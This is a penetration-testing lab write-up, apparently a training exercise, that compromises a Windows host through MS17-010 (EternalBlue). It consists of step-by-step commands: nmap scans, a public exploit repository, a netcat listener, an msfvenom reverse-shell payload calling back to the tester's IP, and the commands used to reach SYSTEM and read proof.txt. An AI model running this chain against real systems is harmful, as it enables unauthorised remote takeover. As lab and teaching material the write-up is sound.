Report

Report

1. Run a SYN stealth scan on all ports.
`sudo nmap -p- 10.11.1.227`
![b82a61e7b562be566a9c57eb17a895b4.png](4cb568f8ac2d46f8b4dfaad6a25baaf4.png)

2. Run a deeper scan on the open ports. We will use the aggressive switch, service detection, and run the NSE scripts for default, safe, auth, and vuln
`sudo nmap -A -sV -p21,25,80,135,139,443,445,1025,1026,1028,3372,5800,5900,6532,27900 --script vuln 10.11.1.227`
![62dd52a863eef0a912d7fffd8b9bdd7d.png](c236edd3ec724997b1bf6edb288ab1e6.png)
![206b334374032a348b196518c086d0df.png](df7f482ad0ea4b398c8ba8c4b47d8260.png)
![59b6fecb36fdc7139e034c886b238893.png](696e39b4de884782892ca53d79a0bf2d.png)
![79d85f9f877ad984ad956cff0b9ac9fe.png](262d3b7872b14dcc8ef2919b613b6498.png)

3. We see that it is vulnerable to ms17-010
![b1a2f9d078df27e4be6de4e56b4c085c.png](38bdd959f4334c5196341db547a120c5.png)

4. Clone this repo
`git clone https://github.com/helviojunior/MS17-010.git`
![eedbdbc2e4590b74c80830718b632652.png](a49574f92c8d47db8d30f1266d1491c5.png)

5. Start a netcat listener
`sudo nc -lvnp 9999`
![e890869f28af27d1608568044e9edee8.png](4cc993d86b014b90a016a73c23329d37.png)

6. Create shellcode
`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.214 LPORT=9999 EXITFUNC=thread -f exe -a x86 --platform windows -o rev_192.168.119.214_9999.exe`
![4be9e23f2d41d8e67294ae16d11b596b.png](4404612328d44ae8ad114cdfc42c61d1.png)

7. Run MS17-010 send_and_execute.py
`python ~/gitWorkspace/tools/MS17-010/send_and_execute.py 10.11.1.227 shellcode/rev_192.168.119.214_9999.exe`
![49a30f0a846c599bef0a5f0331119958.png](eda079fd2184462b83ae9032e5924ffa.png)

8. The listener caught the shell
![96165fa317c45b05cc2dc6b4b967ec3d.png](db35ca6e164b4be491cd7b3d178732b7.png)

9. Find out what user we are. We are SYSTEM
`whoami`
![3fe91d1ec3c33a63dcf97da13b177428.png](35bc558725b545b3af3d8b066338d2a9.png)

10. Display the IP address
`ipconfig`
![388b44d12eab6fb5f63e420ea4481ecb.png](97eacdadd18641f68a9a626bb43b4bf9.png)

11. Display the proof.txt file
`cd "c:\Documents and Settings\Administrator\Desktop"`
`dir`
`more proof.txt`
![6bc18617741e8db06f7889e7af7f1861.png](014c7138a4e346d79ec809251dc0fb24.png)
